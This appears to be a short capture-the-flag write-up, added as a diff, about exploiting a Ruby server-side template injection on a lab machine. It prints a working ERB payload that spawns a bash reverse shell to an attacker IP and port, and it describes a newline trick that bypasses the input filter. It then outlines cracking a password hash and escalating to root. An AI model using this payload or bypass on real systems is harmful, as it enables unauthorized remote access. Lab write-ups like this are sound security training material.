@@ -1,0 +1,10 @@
+A Ruby based machine which has a SSTI ( server side template injection vulnerability) . Initial payload entered does not work
+, it is detected as being malicious input . Adding a new line seems to bypass the check .
+
+
+<%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").readlines() %> (payload that is eventually url encoded)
+that spawns a interactive shell . Once we are in the system, from that point on searching the files a hashed password is revealed.
+I explained the steps taken to dehash it with hashcat in another repo of mine https://github.com/RageLessLion/cyb_tools/blob/main/hashcat/mask_attack.txt 
+
+A simple 'id' command reveals that the initial user that we were logged in as had root access due to a group he was in.
+root.txt is revealed once we logged in using the dehashed password. 
